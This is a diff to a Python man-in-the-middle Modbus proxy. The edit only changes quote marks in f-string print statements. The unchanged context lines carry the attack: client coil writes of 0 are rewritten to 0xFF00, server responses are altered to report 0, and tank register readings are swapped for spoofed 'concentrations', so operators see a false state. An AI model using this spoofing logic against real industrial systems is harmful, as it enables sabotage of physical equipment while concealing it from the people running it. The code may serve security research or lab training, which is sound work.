@@ -138,10 +138,10 @@ class MITMModbusProxy:
             if parsed_data_map["coil_value"] == 0:
                 old_value = parsed_data_map["coil_value"]
                 parsed_data_map["coil_value"] = 0xFF00
-                print(f"\t**Spoofing client command: WRITE {old_value.to_bytes(2, byteorder='big')} --> WRITE {parsed_data_map["coil_value"].to_bytes(2, byteorder='big')}")
+                print(f"\t**Spoofing client command: WRITE {old_value.to_bytes(2, byteorder='big')} --> WRITE {parsed_data_map['coil_value'].to_bytes(2, byteorder='big')}")
                 spoofedTankState.set_client_cmd_coil(False)
             else:
-                print(f"\tWARNING: WRITE {parsed_data_map["coil_value"]} not supported by MITM code in transform_client_data()...")
+                print(f"\tWARNING: WRITE {parsed_data_map['coil_value']} not supported by MITM code in transform_client_data()...")
         
         # Since commands 0x01, 0x02, 0x03 are reading the state from the tank, there is no need to update/spoof the values until they are going back from the server
         elif parsed_data_map['function_code'] in [0x03, 0x02, 0x01]:
@@ -160,9 +160,9 @@ class MITMModbusProxy:
                 old_value = parsed_response_map["coil_value"]
                 new_value = 0
                 parsed_response_map["coil_value"] = new_value.to_bytes(2,byteorder='big')
-                print(f"\t**Spoofing server response: WRITE {old_value.to_bytes(2,byteorder='big')} --> WRITE {parsed_response_map["coil_value"]}\n")
+                print(f"\t**Spoofing server response: WRITE {old_value.to_bytes(2,byteorder='big')} --> WRITE {parsed_response_map['coil_value']}\n")
             else:
-                print(f"\tWARNING: WRITE {parsed_response_map["coil_value"]} not supported by MITM code in transform_server_data()...")
+                print(f"\tWARNING: WRITE {parsed_response_map['coil_value']} not supported by MITM code in transform_server_data()...")
 
         elif parsed_response_map['function_code'] == 0x03:
             # print("function code 0x03...need to update")
@@ -170,7 +170,7 @@ class MITMModbusProxy:
             spoofed_reg = spoofedTankState.get_concentrations()
             old_reg_values = parsed_response_map["register_data"]
             parsed_response_map["register_data"] = [register for register in spoofed_reg]
-            print(f"\t**Spoofing server response: {old_reg_values} changed to {parsed_response_map["register_data"]}")
+            print(f"\t**Spoofing server response: {old_reg_values} changed to {parsed_response_map['register_data']}")
         elif parsed_response_map['function_code'] in [0x02, 0x01]:
             # print("function code 0x02...need to update")
             # since the discrete_inputs and output_coils aren't used in client side calculations, there is no need to change them here.
